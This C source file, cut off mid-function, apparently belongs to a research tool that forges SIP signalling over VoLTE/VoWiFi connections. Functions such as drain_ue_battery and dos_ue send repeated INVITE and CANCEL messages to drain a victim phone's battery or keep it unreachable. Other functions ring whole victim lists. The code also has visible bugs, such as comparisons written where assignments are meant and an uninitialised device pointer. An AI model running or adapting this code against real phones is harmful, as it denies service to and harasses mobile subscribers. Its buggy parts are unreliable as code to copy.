#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#include <sys/time.h>

#include "dev.h"
#include "net.h"
#include "esp.h"
#include "transport.h"
#include "sip.h"
#include "replay.h"
#include "utils.h"

#define MAXVICTIM 16
#define TWIN_SIP "140.113.207.234"
#define TWIN_DIP "140.113.207.246"

void tx_bin_data(char *INTERFACE,
                 char *FILENAME)
{
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(FILENAME);

    ssize_t nb;

    Dev dev;

    init_dev(&dev, INTERFACE);

    dev.framelen = read_file(FILENAME, dev.frame);
    nb = dev.tx_frame(&dev);

#ifdef ARM
    printf("%d bytes are sent.\n", nb);
#else
    printf("%ld bytes are sent.\n", nb);
#endif
}


void rx_and_show_dissect_res(char *OPERATOR,
                             char *INTERFACE)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip;

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip);

    dev.framelen = dev.rx_frame(&dev);

    if (!dissect_rx_data(&dev, &net, &esp, &txp, &sip)) {
        fprintf(stderr, "Unknown receive data format.");
        exit(EXIT_FAILURE);
    }

    show_dissected_res(&dev, &net, &esp, &txp, &sip);
}


void attempt_to_make_call(char *OPERATOR,
                          InfoSrc INFOSRC,
                          char *INTERFACE,
                          char *ATKID,
                          char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(ATKID);
    HANDLE_ARG_ERR(VICID);

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip;

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip);

    SipStats trying[] = {TRY, UNKN_STAT};
    SipStats sprog[] = {SPROC, UNKN_STAT};
    SipStats ringing[] = {RING, UNKN_STAT};

    if (INFOSRC == SINFO)
        get_session_info(&dev, &net, &esp, &txp, &sip);
    else
        get_register_info(&dev, &net, &esp, &txp, &sip);

    char const * const x_src_ip = strdup(net.x_src_ip);
    char const * const x_dst_ip = strdup(net.x_dst_ip);

    strcpy(net.x_src_ip, x_src_ip);
    strcpy(net.x_dst_ip, x_dst_ip);

    // =========== wait for sth ===============

    //puts("Waiting 10 second...");
    //// follow TCP, ESP sequence number
    //wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, stat_null, 10, DISABLE_TCP_ACK);

    sip.gen_flds(&net, ATKID, VICID, &sip);
    tx_sip_inv(&dev, &net, &esp, &txp, &sip, invite, 0);
    puts("INV");

    wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, trying, 0, ENA_TCP_ACK);
    puts("TRYING");

    wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, sprog, 0, ENA_TCP_ACK);
    puts("SPROG");

    tx_sip_prack(&dev, &net, &esp, &txp, &sip, prack);
    puts("PRACK");

    wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, ringing, 0, ENA_TCP_ACK);
    puts("RINGING");

    wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, stat_ok, 0, ENA_TCP_ACK);
    puts("OK");

    tx_sip_ack(&dev, &net, &esp, &txp, &sip, ack);
    puts("ACK");

    //kpt_session_alive(&dev, &net, &esp, &txp, &sip, 600);

    //tx_sip_ack(&dev, &net, &esp, &txp, &sip, bye);
    //puts("BYE");
}


void drain_ue_battery(char *OPERATOR,
                      InfoSrc INFOSRC,
                      char *INTERFACE,
                      char *ATKID,
                      char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(VICID);

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip;
    SipStats sproc[] = {SPROC, UNKN_STAT};
    SipStats decline[] = {DECLINE, UNKN_STAT};
    SipStats reqterm[] = {REQTERM, UNKN_STAT};

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip);

    if (INFOSRC == SINFO)
        get_session_info(&dev, &net, &esp, &txp, &sip);
    else
        get_register_info(&dev, &net, &esp, &txp, &sip);

    char const * const x_src_ip = strdup(net.x_src_ip);
    char const * const x_dst_ip = strdup(net.x_dst_ip);

    while (true) {
        strcpy(net.x_src_ip, x_src_ip);
        strcpy(net.x_dst_ip, x_dst_ip);
        sip.gen_flds(&net, ATKID, VICID, &sip);

        tx_sip_inv(&dev, &net, &esp, &txp, &sip, invite, 0);
        puts("INV");

        if (wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, sproc, 4, ENA_TCP_ACK))
            puts("SPROC");

        tx_sip_cancel(&dev, &net, &esp, &txp, &sip, cancel, 0);
        puts("CANCEL");

        wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, reqterm, 1, ENA_TCP_ACK);
        puts("REQTERM");

        tx_sip_ack(&dev, &net, &esp, &txp, &sip, ack);
        puts("ACK");

        if (!wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, decline, 1, ENA_TCP_ACK))
            continue;

        if (sip.stac == DECLINE) {
            puts("DECLINE");

            tx_sip_ack(&dev, &net, &esp, &txp, &sip, ack);
            puts("ACK");
        }
    }
}


void dos_ue(char *OPERATOR,
            char *INTERFACE,
            char *INTERFACE_R,
            Mode MODE,
            char *SERVIP,
            char *PORT,
            char *ATKID,
            char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(ATKID);
    HANDLE_ARG_ERR(VICID);
    HANDLE_ARG_ERR(MODE);
    HANDLE_ARG_ERR(PORT);
    if(MODE == CLIENT)
        HANDLE_ARG_ERR(SERVIP);

    short pre = 0, dyn = 1, saf = 2, wat = 3;
    int fd;

    Dev dev;
    Dev Dev_r;
    Dev *dev_r;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip_arr[4];

    SipStats sprog[] = {SPROC, UNKN_STAT};
    SipStats reqterm[] = {REQTERM, UNKN_STAT};

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip_arr[0]);
    init_sip(&sip_arr[1]);
    init_sip(&sip_arr[2]);
    init_sip(&sip_arr[3]);
    init_frame_buf();
    init_sip(&dub_sip);

    if(INTERFACE_R == NULL) {
        dev_r = &dev;
    } else {
        dev_r = &Dev_r;
        init_dev(dev_r, INTERFACE_R);
    }
    dev_r->dev_s = &dev;
    /*
        if((fd = estab_tcp_conn(MODE, SERVIP, PORT)) == -1 ) {
            perror("estab_tcp_conn()");
            exit(EXIT_FAILURE);
        }
    */
    restart_ims(OPERATOR);

    puts("Waiting for re-registration");
    get_register_info(dev_r, &net, &esp, &txp, &sip_arr[0]);

    struct timespec t1;
    int client_wait_time;
    char buf[20];
    double wait_t;
    uint32_t temp_seq;

    int succ_c = 0, fail_c = 0, int_dyn, int_saf;
    struct timeval t_start[2], t_now[2], t_result;

    int_dyn = 650;
    int_saf = 900;

    srand(time(NULL));
    client_wait_time = 300;

    while(MODE == CLIENT) {
        wait_notification(fd);
        puts("RX_NOTIFICATION");
        get_timestamp(&t1);

        sip_arr[1].gen_flds(&net, ATKID, VICID, &sip_arr[1]);
        txp.thdr.th_win = htons(46080);

        tx_sip_inv(&dev, &net, &esp, &txp, &sip_arr[1], invite, client_wait_time);
        flush_frame_buf(&dev, t1);
        puts("INV");


        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[wat], sprog, 0, ENA_TCP_ACK);

        if(get_call_sys_type(&net, &sip_arr[wat]) == 3) {// VoWIFI Idle
            puts("IDLE");
            sprintf(buf,"%d T", client_wait_time);
            record_log_with_time(buf);
        } else {
            puts("RING");
            sprintf(buf,"%d F", client_wait_time);
            record_log_with_time(buf);
        }

        tx_sip_cancel(&dev, &net, &esp, &txp, &sip_arr[1], cancel, 0 );
        puts("CANCEL");

        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[wat], reqterm, 5, ENA_TCP_ACK);
        puts("REQTERM");

    }
    if (MODE == SERVER) {

        sip_arr[pre].gen_flds(&net, ATKID, VICID, &sip_arr[pre]);
        tx_sip_inv(&dev, &net, &esp, &txp, &sip_arr[pre], invite, 0 );

        int round = 0;
        while(1) {
            //tx_notification(fd);
            puts("TX_NOTIFICATION");
            printf("Round : %d\n", round++);

            get_timestamp(&t1);

            sip_arr[dyn].gen_flds(&net, ATKID, VICID, &sip_arr[dyn]);
            sip_arr[saf].gen_flds(&net, ATKID, VICID, &sip_arr[saf]);

            int sp_arr[3], sp_c = 0, succ_f = 0;
            for(int i=0; i<3; i++)
                sp_arr[i] = 0;
inv:
            temp_seq = txp.x_tx_seq;
            txp.thdr.th_win = htons(46080);

            tx_sip_inv(&dev, &net, &esp, &txp, &sip_arr[dyn], invite, int_dyn );
            flush_frame_buf(&dev, t1);
            puts("INV");

            gettimeofday(&t_start[0], NULL);

            tx_sip_inv(&dev, &net, &esp, &txp, &sip_arr[saf], invite, int_saf );
            flush_frame_buf(&dev, t1);
            puts("INV");

            gettimeofday(&t_start[1], NULL);

            tx_sip_cancel(&dev, &net, &esp, &txp, &sip_arr[pre], cancel, 1000);
            puts("CANCEL");
            flush_frame_buf(&dev, t1);

            gettimeofday(&t_now[0], NULL);
            timersub(&t_now[0], &t_start[0], &t_result);

            wait_t = 3 - (t_result.tv_sec + (t_result.tv_usec * 0.000001));

            while(wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[wat], sprog, wait_t, ENA_TCP_ACK)) {
                for(int i=0; i<3; i++) {
                    if(i == wat || i == pre || sp_arr[i] == 1)
                        continue;

                    if(sip_arr[wat].call_id != NULL && strcmp(sip_arr[wat].call_id, sip_arr[i].call_id) == 0) {
                        printf("%s, %s\n",sip_arr[wat].call_id,sip_arr[wat].as);
                        puts("SPROG");
                        if(get_call_sys_type(&net, &sip_arr[wat]) == 3) {
                            succ_f = 1;
                            char buf[1024];
                            sprintf(buf,"%d SUCC",((i == dyn) ? int_dyn : int_saf));
                            record_log_with_time(buf);

                            if(i == saf) {
                                fail_c ++;
                                succ_c = 0;
                            } else {
                                succ_c ++;
                                fail_c = 0;
                            }

                            if(fail_c == 5) {
                                int_dyn += 10;
                                fail_c = 0;
                            } else if(succ_c == 5) {
                                int_dyn -= 10;
                                succ_c = 0;
                            }

                            pre = i;
                        } else {
                            puts("RING");
                        }
                        /*
                                                if(get_call_sys_type(&net, &sip_arr[wat]) == 0)
                                                    printf("IS RING\n");
                                                else if(get_call_sys_type(&net, &sip_arr[wat]) == 3)
                                                    printf("IS VoWIFI/VoLTE IDLE\n");
                                                else if(get_call_sys_type(&net, &sip_arr[wat]) == 4)
                                                    printf("IS EXTERNEL\n");
                                                else
                                                    printf("UNKNOWN SYSTEM!\n");
                        */
                        sp_arr[i] = 1;
                        sp_c ++;

                    }
                }

                if(sp_arr[dyn] == 1) {
                    gettimeofday(&t_now[1], NULL);
                    timersub(&t_now[1], &t_start[1], &t_result);
                } else {
                    gettimeofday(&t_now[0], NULL);
                    timersub(&t_now[0], &t_start[0], &t_result);
                }
                wait_t = 3 - (t_result.tv_sec + (t_result.tv_usec * 0.000001));
                if(sp_c == 2)
                    break;
            }
            if(wait_esp_tcp_seq(dev_r, &net, &esp, &txp, &sip_arr[wat], 5) == NULL) {
                txp.x_tx_seq = temp_seq;
                record_log_with_time("SEQ FAIL");
                goto inv;
            }
            if(sp_c != 2)
                printf("IS 3G\n");

            if(succ_f != 1)
                record_log_with_time("ALL FAIL");

can:
            temp_seq = txp.x_tx_seq;
            for(int i=0; i<3; i++) {
                if(i == pre)
                    continue;
                else if(i != dyn && i != saf) {
                    if(pre == dyn)
                        dyn = i;
                    else
                        saf = i;
                } else {
                    tx_sip_cancel(&dev, &net, &esp, &txp, &sip_arr[i], cancel, 0);
                    puts("CANCEL");
                }
            }
            if(wait_esp_tcp_seq(dev_r, &net, &esp, &txp, &sip_arr[wat], 5) != NULL)
                puts("REQTERM");
            else {
                txp.x_tx_seq = temp_seq;
                goto can;
            }
            wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[wat], stat_null, 2, ENA_TCP_ACK);
        }
    }
}


void forge_no(char *OPERATOR,
              InfoSrc INFOSRC,
              char *INTERFACE,
              char *ATKID,
              char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(ATKID);
    HANDLE_ARG_ERR(VICID);
}


void estab_dchannel(char *OPERATOR,
                    Mode MODE,
                    InfoSrc INFOSRC,
                    char *INTERFACE,
                    char *REMOTE_ID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(MODE);
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(REMOTE_ID);
}



void estab_simo_multi_session(char *OPERATOR,
                              InfoSrc INFOSRC,
                              char *INTERFACE,
                              char *LIST,
                              char* ATKID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(LIST);

    ssize_t n;
    ssize_t cnt = 0;

    int match_sip_idx;
    char *sipids[MAXVICTIM + 1] = {NULL};

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip;
    SipStats target[4] = {TRY, SPROC, RING, UNKN_STAT};

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip);

    if (INFOSRC == SINFO)
        get_session_info(&dev, &net, &esp, &txp, &sip);
    else
        get_register_info(&dev, &net, &esp, &txp, &sip);

    n = get_victim_list(sipids, LIST);

    Sip sip_arr[n];

    for (ssize_t i = 0; i < n; i++) {
        init_sip(&sip_arr[i]);
        sip.gen_flds(&net, ATKID, sipids[i], &sip_arr[i]);
        tx_sip_by_stac(&dev, &net, &esp, &txp, &sip_arr[i]);
    }

    while(true) {
        while (wait_sip_all_stac(&dev, &net, &esp, &txp, &sip, target, 1, ENA_TCP_ACK)) {
            /* Update stac and send next */
            match_sip_idx = get_match_sip_idx(&sip, sip_arr, n);

            cpy_to_tag(&sip, &sip_arr[match_sip_idx]);

            cnt = sip.stac == RING && sip_arr[match_sip_idx].rep_stac != RING ?
                  cnt + 1 : cnt;

            upda_rep_stac(&sip, &sip_arr[match_sip_idx]);
            tx_sip_by_stac(&dev, &net, &esp, &txp, &sip_arr[match_sip_idx]);
        }

        for (ssize_t i = 0; i < n; i++) {
            ck_t_out(&sip_arr[i]);
            tx_sip_by_stac(&dev, &net, &esp, &txp, &sip_arr[i]);
        }

        /* All of the RING we expected to receive are received */
        if (cnt == n)
            break;
    }

    FREE(*sipids);
}


void estab_multi_session(char *OPERATOR,
                         InfoSrc INFOSRC,
                         char *INTERFACE,
                         char *LIST,
                         char* ATKID)
{
    /* HANDLE_ARG_ERR(OPERATOR); */
    HANDLE_ARG_ERR(INFOSRC);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(LIST);

    ssize_t n;

    char *sipids[MAXVICTIM + 1] = {NULL};
    char *invite[2] = {"inv1.bin", "inv2.bin"};
    char *prack = "prack.bin";

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip;


    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip);

    if (INFOSRC == SINFO)
        get_session_info(&dev, &net, &esp, &txp, &sip);
    else
        get_register_info(&dev, &net, &esp, &txp, &sip);

    n = get_victim_list(sipids, LIST);

    for (ssize_t i = 0; i < n; i++) {
        sip.gen_flds(&net, ATKID, sipids[i], &sip);

        if (tx_sip_inv(&dev, &net, &esp, &txp, &sip, invite, 0))
            puts("INV");

        if (wait_sip_sta(&dev, &net, &esp, &txp, &sip, TRY, 0, ENA_TCP_ACK))
            puts("TRY");

        if (wait_sip_sta(&dev, &net, &esp, &txp, &sip, SPROC, 0, ENA_TCP_ACK))
            puts("SPROC");

        if (tx_sip_prack(&dev, &net, &esp, &txp, &sip, prack))
            puts("PRACK");

        if (wait_sip_sta(&dev, &net, &esp, &txp, &sip, RING, 3, ENA_TCP_ACK))
            puts("RING");
    }

    FREE(*sipids);
}

void twin_caller(char *OPERATOR,
                 char *INTERFACE,
                 char *INTERFACE_R,
                 Mode MODE,
                 char *SERVIP,
                 char *PORT,
                 char *ATKID,
                 char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(ATKID);
    HANDLE_ARG_ERR(VICID);
    HANDLE_ARG_ERR(MODE);
    HANDLE_ARG_ERR(PORT);
    if(MODE == CLIENT)
        HANDLE_ARG_ERR(SERVIP);

    short acc = 0, bac = 1, wat = 2;
    int fd;

    Dev dev;
    Dev Dev_r;
    Dev *dev_r;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip_arr[4];

    SipStats sprog[] = {SPROC, UNKN_STAT};
    SipStats reqterm[] = {REQTERM, UNKN_STAT};
    SipStats trying[] = {TRY, UNKN_STAT};
    SipStats ringing[] = {RING, UNKN_STAT};

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip_arr[0]);
    init_sip(&sip_arr[1]);
    init_sip(&sip_arr[2]);
    init_sip(&sip_arr[3]);
    init_frame_buf();
    init_sip(&dub_sip);

    get_register_info(dev_r, &net, &esp, &txp, &sip_arr[0]);

    int udp_client_fd;
    int server_size;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    uint8_t sip_data[BUFSIZE];
    int nb;

    if((udp_client_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket()");
        exit(-1);
    }
    int flag = 1, flen = sizeof(int);

    if(setsockopt(udp_client_fd, SOL_SOCKET, SO_REUSEADDR, &flag, flen) == -1) {
        perror("setsocketopt()");
        exit(-1);
    }

    bzero((char*)&client_addr, sizeof(client_addr));

    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(TWIN_SIP);
    client_addr.sin_port = htons(8222);

    if((bind(udp_client_fd, (struct sockaddr *)&client_addr, sizeof(client_addr))) < 0) {
        perror("bind()");
        exit(-1);
    }

    bzero((char*)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(TWIN_DIP);
    server_addr.sin_port = htons(4060);


    puts("CLIENT START");
    server_size = sizeof(server_addr);
    for(int i=0; i<18; i++) {
        nb = read_file("inv1.bin", sip_data);
        sip_arr[acc].gen_flds(&net, ATKID, VICID, &sip_arr[acc]);
        nb = compose_sip(&net, &sip_arr[acc], sip_data, nb );

        if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
            perror("sendto()");
            exit(-1);
        }
        puts("INV");

        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[0], sprog, 0, DISABLE_TCP_ACK);
        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[0], sprog, 0, DISABLE_TCP_ACK);
        puts("SPROG");

        recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);
    }

    exit(0);
    nb = read_file("prack1.bin", sip_data);
    nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("PRACK");

    wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[0], ringing, 0, DISABLE_TCP_ACK);
    wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[0], ringing, 0, DISABLE_TCP_ACK);
    puts("RING");

    recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

}

void launch_as_callee(char *OPERATOR,
                      char *INTERFACE,
                      char *INTERFACE_R)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);

    typedef struct Session_INFO {
        int call_id_len;
        char call_id[100];
        int host_len;
        char host[10];
        int port;
        int method;
        int state;
    } session_info;
    session_info sessions[101];
    int sessions_len = 0;

    Dev dev;
    Dev Dev_r;
    Dev *dev_r;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip_arr[5];


    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip_arr[0]);
    init_sip(&sip_arr[1]);
    init_sip(&sip_arr[2]);
    init_sip(&sip_arr[3]);
    init_sip(&sip_arr[4]);

    if(INTERFACE_R == NULL) {
        dev_r = &dev;
    } else {
        dev_r = &Dev_r;
        init_dev(dev_r, INTERFACE_R);
    }
    dev_r->dev_s = &dev;

    get_register_info(dev_r, &net, &esp, &txp, &sip_arr[0]);

    /* CHT */
    /*
    txp.x_src_port = ntohs(txp.thdr.th_sport);
    txp.x_dst_port = ntohs(txp.thdr.th_dport);
    txp.x_tx_ack = ntohl(txp.thdr.th_ack);
    txp.x_tx_seq = ntohl(txp.thdr.th_seq) + txp.plen;
    */
    /* Twin */
    if(net.opr == SD) {

        wait_sip(dev_r, &net, &esp, &txp, &sip_arr[1], meth_null, stat_null, 5, DISABLE_TCP_ACK);

        int udp_client_fd;
        int server_size;
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        uint8_t sip_data[BUFSIZE];
        int nb;

	// bind udp port
        if((udp_client_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("socket()");
            exit(-1);
        }
        int flag = 1, flen = sizeof(int);

        if(setsockopt(udp_client_fd, SOL_SOCKET, SO_REUSEADDR, &flag, flen) == -1) {
            perror("setsocketopt()");
            exit(-1);
        }

        bzero((char*)&client_addr, sizeof(client_addr));

        client_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr(TWIN_SIP);
        client_addr.sin_port = htons(8223);

        if((bind(udp_client_fd, (struct sockaddr *)&client_addr, sizeof(client_addr))) < 0) {
            perror("bind()");
            exit(-1);
        }

        bzero((char*)&server_addr, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr(TWIN_DIP);
        server_addr.sin_port = htons(4060);

        session_info *new_s;

        puts("CLIENT START");
        int source_p;
        while(1) {
state1:
	    // wait invite or prack to port 4060
            wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_invprack, 0, DISABLE_TCP_ACK);
            if(ntohs(txp.uhdr.dest) != 4060)
                goto state1;
	    // client 1 port
            source_p = ntohs(txp.uhdr.source);
state2:
	    // wait invite or prack from port 4060
            wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_invprack, 0, DISABLE_TCP_ACK);
            if(ntohs(txp.uhdr.source) != 4060) {
                source_p = ntohs(txp.uhdr.source);
                goto state2;
            }
	    // so client should be set to 8224 (?
            if(source_p == 8224) {
                if(sip_arr[0].st == REQ && sip_arr[0].meth == INV) {
                    puts("INVITE");

                    server_size = sizeof(server_addr);
		    // recv udp from port 4060 to port 8223
                    recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

		    // sessions_len start from 0
                    new_s = &sessions[sessions_len];
                    strcpy(new_s->call_id, sip_arr[0].call_id);
                    new_s->call_id_len = strlen(new_s->call_id);
                    strcpy(new_s->host, sip_arr[0].caller_id);
                    new_s->host_len = strlen(new_s->host);
                    new_s->port = ((strcmp(new_s->host, "alice") == 0) ? 8222: 8224); // so alice set to 8222(?
                    new_s->method = 5;
                    new_s->state = 1;
                    sessions_len ++;

                    nb = read_file("try1_t.bin", sip_data);
                    nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

		    // send trying to port 4060
                    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                        perror("sendto()");
                        exit(-1);
                    }
                    puts("TRY");

		    // send sprog to port 4060
                    nb = read_file("sprog1_t.bin", sip_data);
                    gen_rnd_str(sip_arr[0].to_tag, 5);
                    nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

                    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                        perror("sendto()");
                        exit(-1);
                    }
                    puts("SPROG");

                }
		// this will reset sessions_len
                if(sip_arr[0].st == REQ && sip_arr[0].meth == PRACK) {
                    puts("PRACK");

		    // recv udp from port 4060 to port 8223
                    recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

		    // scan existing session choose matched one
                    for(int i=0; i<sessions_len; i++) {
                        if(sessions[i].call_id_len == strlen(sip_arr[0].call_id) &&
                                strcmp(sessions[i].call_id, sip_arr[0].call_id) == 0 &&
                                sessions[i].host_len == strlen(sip_arr[0].caller_id) &&
                                strcmp(sessions[i].host, sip_arr[0].caller_id) == 0 &&
                                sessions[i].port == (((strcmp(new_s->host, "alice") == 0) ? 8222: 8224)) &&
                                sessions[i].method == 5 &&
                                sessions[i].state == 1
                          ) {
                            sessions[i].method == 6;
                            sessions[i].state == 2;
                            break;
                        }

                    }

		    // send ok to which has sent prack
                    nb = read_file("ok2_t.bin", sip_data);
                    nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

		    // send trying to port 4060
                    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                        perror("sendto()");
                        exit(-1);
                    }
                    puts("OK");

                    wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[1], stat_ok, 0, DISABLE_TCP_ACK);
                    wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[1], stat_ok, 0, DISABLE_TCP_ACK);

                    nb = read_file("ring1_t.bin", sip_data);
                    nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

                    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                        perror("sendto()");
                        exit(-1);
                    }
                    puts("RING");
                    sessions_len = 0;
                }
            } else { // source port not 8224
                puts("INVITE");

                server_size = sizeof(server_addr);
                recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

                new_s = &sessions[sessions_len];
                strcpy(new_s->call_id, sip_arr[0].call_id);
                new_s->call_id_len = strlen(new_s->call_id);
                strcpy(new_s->host, sip_arr[0].caller_id);
                new_s->host_len = strlen(new_s->host);
                new_s->port = ((strcmp(new_s->host, "alice") == 0) ? 8222: 8224);
                new_s->method = 5;
                new_s->state = 1;
                sessions_len ++;


                nb = read_file("try1.bin", sip_data);
                nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

                if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                    perror("sendto()");
                    exit(-1);
                }
                puts("TRY");

                nb = read_file("sprog1.bin", sip_data);
                gen_rnd_str(sip_arr[0].to_tag, 5);
                nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

                if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
                    perror("sendto()");
                    exit(-1);
                }
                puts("SPROG");
            }
        }

        wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_inv, 0, DISABLE_TCP_ACK);
        wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_inv, 0, DISABLE_TCP_ACK);
        puts("INVITE");

        server_size = sizeof(server_addr);
        recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

        new_s = &sessions[sessions_len];
        strcpy(new_s->call_id, sip_arr[0].call_id);
        new_s->call_id_len = strlen(new_s->call_id);
        strcpy(new_s->host, sip_arr[0].caller_id);
        new_s->host_len = strlen(new_s->host);
        new_s->port = ((strcmp(new_s->host, "alice") == 0) ? 8222: 8224);
        new_s->method = 5;
        new_s->state = 1;
        sessions_len ++;

        nb = read_file("try1_t.bin", sip_data);
        nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

        if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
            perror("sendto()");
            exit(-1);
        }
        puts("TRY");

        nb = read_file("sprog1_t.bin", sip_data);
        gen_rnd_str(sip_arr[0].to_tag, 5);
        nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

        if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
            perror("sendto()");
            exit(-1);
        }
        puts("SPROG");

        wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_prack, 0, DISABLE_TCP_ACK);
        wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_prack, 0, DISABLE_TCP_ACK);
        puts("PRACK");

        recvfrom(udp_client_fd, &sip_data, BUFSIZE, 0, (struct sockaddr*)&server_addr, (socklen_t *)&server_size);

